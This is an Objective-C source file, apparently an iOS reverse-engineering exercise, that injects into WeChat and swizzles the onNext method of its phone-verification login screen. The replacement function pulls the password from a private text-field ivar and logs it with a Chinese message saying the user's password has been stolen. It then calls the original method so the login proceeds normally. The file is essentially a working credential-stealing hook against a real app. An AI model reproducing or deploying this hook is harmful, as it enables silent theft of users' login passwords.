//
//  ZJJInjection.m
//  Injection
//
//  Created by 赵静静 on 2020/9/17.
//  Copyright © 2020 赵静静. All rights reserved.
//

#import "ZJJInjection.h"
#import <objc/runtime.h>
#import <UIKit/UIKit.h>
@implementation ZJJInjection

+(void)load{


    /*************第一种方法**********************/
//    //添加新方法
//    /**
//     * 1、给哪个类添加方法
//     * 2、方法编号
//     * 3、方法实现（地址）
//     */
//    //获取函数的指针
//    IMP zjj_onNext = [[self new] methodForSelector: @selector(zjj_onNext)];
//    //给WCAccountMainLoginViewController添加方法
//    BOOL didAddMethod = class_addMethod(objc_getClass("WCAccountNewPhoneVerifyViewController"), @selector(zjj_onNext), zjj_onNext, "v@:");
//
//    //原始微信的登录方法
//    Method oldMethod = class_getInstanceMethod(objc_getClass("WCAccountNewPhoneVerifyViewController"), @selector(onNext));
//    //原始微信的登录方法
//    Method newMethod = class_getInstanceMethod(objc_getClass("WCAccountNewPhoneVerifyViewController"), @selector(zjj_onNext));
//    if (didAddMethod) {
//        NSLog(@"交换成功");
//        method_exchangeImplementations(oldMethod,newMethod);
//    }

    /*************第二种方法**********************/

    //保存老的函数体
     old_onNext = method_getImplementation(class_getInstanceMethod(objc_getClass("WCAccountNewPhoneVerifyViewController"), @selector(onNext)));
    //将方法编号onNext对应的函数指针重新set下
    method_setImplementation(class_getInstanceMethod(objc_getClass("WCAccountNewPhoneVerifyViewController"), @selector(onNext)), new_onNext);
}

//指针 ，用来保存老的函数。
IMP (*old_onNext)(id self,SEL _cmd);

//新的函数实现
void new_onNext(id self,SEL _cmd){
    //拿出用户的密码
    UITextField * pwd = [[self valueForKey:@"_textFieldPwdItem"] valueForKey:@"m_textField"];
    NSLog(@"窃取到用户的密码是%@",pwd.text);
    old_onNext(self,_cmd);
}

-(void)zjj_onNext{
    //拿出用户的密码
    UITextField * pwd = [[self valueForKey:@"_textFieldPwdItem"] valueForKey:@"m_textField"];
    NSLog(@"%@ --- 窃取到用户的密码是%@",self,pwd.text);

    [self zjj_onNext];
}


/**
 交换方法

 @param clss 需要交换方法的类
 @param originalSelector 原来方法
 @param swizzledSelector 新方法
 */
+ (void)swizzlingInClass:(Class)clss originalSelector:(SEL)originalSelector swizzledSelector:(SEL)swizzledSelector{

    Class class = clss;
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(self, swizzledSelector);

    BOOL didAddMethod = class_addMethod(class, originalSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));

    if (didAddMethod) {
        class_replaceMethod(class, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod));
    }else{
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
}

@end
